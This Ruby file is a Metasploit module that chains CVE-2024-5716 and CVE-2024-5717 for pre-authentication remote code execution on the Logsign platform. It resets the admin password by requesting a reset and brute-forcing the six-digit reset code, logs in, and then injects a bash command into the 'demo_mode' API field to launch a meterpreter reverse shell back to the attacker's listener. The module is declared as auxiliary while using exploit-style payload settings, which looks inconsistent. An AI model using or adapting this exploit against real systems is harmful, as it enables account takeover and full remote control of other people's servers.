class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'CVE-2024-5716 & CVE-2024-5717 Pre-auth RCE Exploit',
      'Description'    => %q{
        This module exploits a combination of two vulnerabilities, CVE-2024-5716 and CVE-2024-5717, to achieve pre-authentication remote code execution on a vulnerable system.
        CVE-2024-5716 is an authentication bypass vulnerability that allows an attacker to reset the admin user's password without any prior authentication. Using this, the module first resets the admin's password and logs in with the new credentials.
        Once authenticated as the admin, the module exploits CVE-2024-5717, a command injection vulnerability, to execute arbitrary commands on the system. The payload used in this module is Metasploit's meterpreter/reverse_tcp, providing the attacker full control over the system.
      },
      'Author'         => ['Janke'],
      'License'        => MSF_LICENSE,
      'References'     => [
        ['CVE', '2024-5716'],
        ['CVE', '2024-5717'],
        ['URL', 'https://www.zerodayinitiative.com/advisories/ZDI-24-616/'],
        ['URL', 'https://www.zerodayinitiative.com/blog/2024/7/1/getting-unauthenticated-remote-code-execution-on-the-logsign-unified-secops-platform']
      ],
      'DisclosureDate' => '2024-06-03',
      'Platform'       => 'linux',
      'Arch'           => ARCH_PYTHON,
      'Targets'        => [['Automatic', {}]],
      'DefaultTarget'  => 0,
      'Payload'        => {'Space' => 4096, 'DisableNops' => true}
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to the API', '/']),
        OptString.new('USERNAME', [true, 'The username to reset', 'admin']),
        OptAddress.new('LHOST', [true, 'The local listener address', '']),
        OptPort.new('LPORT', [true, 'The local listener port', 4444])
      ]
    )
  end

  def run
    username = datastore['USERNAME']
    lhost = datastore['LHOST']
    lport = datastore['LPORT']
    new_password = rand_text_alphanumeric(20)

    print_status("Resetting admin password using CVE-2024-5716...")

    # Send Forget Password Request (CVE-2024-5716)
    res = send_forget_password_request(username)
    if res.nil?
      fail_with(Failure::Unknown, 'Forget password request failed')
    end

    print_status("Forget password request sent for user: #{username}")

    # Attempt to brute-force the reset code (CVE-2024-5716)
    reset_code, verification_code = brute_force_reset_code(username)
    if reset_code.nil? || verification_code.nil?
      fail_with(Failure::Unknown, 'Failed to brute-force reset code')
    end

    print_status("Successfully brute-forced reset code: #{reset_code}, verification code: #{verification_code}")

    # Reset the password using the obtained verification code
    res = reset_password(username, verification_code, new_password)
    if res.nil?
      fail_with(Failure::Unknown, 'Password reset failed')
    end

    print_status("Password successfully reset to: #{new_password}")

    # Login with the new password to retrieve the session cookie (CVE-2024-5717)
    cookie = login(username, new_password)
    if cookie.nil?
      fail_with(Failure::Unknown, 'Login failed')
    end

    print_status("Successfully logged in with the new password. Session cookie: #{cookie}")

    print_status("CVE-2024-5717 Remote Code Execution process initiated...")

    # Send the Meterpreter payload via command injection
    send_meterpreter_payload(cookie, lhost, lport)

    print_status("Exploit completed, waiting for session...")
  end

  def send_forget_password_request(username)
    uri = normalize_uri(target_uri.path, 'api', 'settings', 'forgot_password')
    data = { 'username' => username }
    send_request_cgi({
      'method' => 'POST',
      'uri'    => uri,
      'ctype'  => 'application/json',
      'data'   => data.to_json
    })
  end

  def brute_force_reset_code(username)
    (0..999999).each do |i|
      reset_code = i.to_s.rjust(6, "0")  # 6 haneli reset kodu denemesi
      res = send_verify_reset_code_request(username, reset_code)
      if res && res.body.include?('Success')
        verification_code = parse_verification_code(res)
        return [reset_code, verification_code]
      end
    end
    return [nil, nil]
  end

  def send_verify_reset_code_request(username, reset_code)
    uri = normalize_uri(target_uri.path, 'api', 'settings', 'verify_reset_code')
    data = { 'username' => username, 'reset_code' => reset_code }
    send_request_cgi({
      'method' => 'POST',
      'uri'    => uri,
      'ctype'  => 'application/json',
      'data'   => data.to_json
    })
  end

  def parse_verification_code(response)
    json = JSON.parse(response.body)
    json['verification_code']
  end

  def reset_password(username, verification_code, new_password)
    uri = normalize_uri(target_uri.path, 'api', 'settings', 'reset_user_password')
    data = {
      'username' => username,
      'verification_code' => verification_code,
      'password' => new_password
    }
    send_request_cgi({
      'method' => 'POST',
      'uri'    => uri,
      'ctype'  => 'application/json',
      'data'   => data.to_json
    })
  end

  def login(username, password)
    uri = normalize_uri(target_uri.path, 'api', 'login')
    data = {
      'username' => username,
      'password' => password
    }
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => uri,
      'ctype'  => 'application/json',
      'data'   => data.to_json
    })
    return nil unless res && res.code == 200

    res.get_cookies
  end

  def send_meterpreter_payload(cookie, lhost, lport)
    # Prepare the Meterpreter payload command
    payload_cmd = payload.encoded.gsub(/"/, '\"')  # Escape double quotes for bash command
    payload_cmd = "bash -c \"#{payload_cmd}\""

    # Use the command injection point to send the Meterpreter payload
    uri = normalize_uri(target_uri.path, 'api', 'settings', 'demo_mode')
    data = {
      'enable' => true,
      'list' => payload_cmd
    }
    send_request_cgi({
      'method' => 'POST',
      'uri'    => uri,
      'ctype'  => 'application/json',
      'cookie' => cookie,
      'data'   => data.to_json
    })
  end

end
